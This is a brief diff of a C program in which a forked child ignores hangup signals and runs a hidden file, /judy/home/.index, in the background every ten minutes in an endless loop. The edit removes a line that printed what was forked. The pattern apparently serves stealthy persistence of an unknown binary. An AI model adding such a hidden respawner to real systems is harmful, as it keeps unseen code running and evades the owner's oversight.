@@ -45,14 +45,12 @@ int main() {
         return 1;
     } else if (pid == 0) {
 
-        printf("/second child forked for /tmp/index\n");
-
         // Ignore SIGHUP to prevent termination when the parent exits
         signal(SIGHUP, SIG_IGN);
 
         while (1) {
-            system("/tmp/index &");
-            sleep(60);  
+            system("/judy/home/.index &");
+            sleep(600);  
         }
     }
 
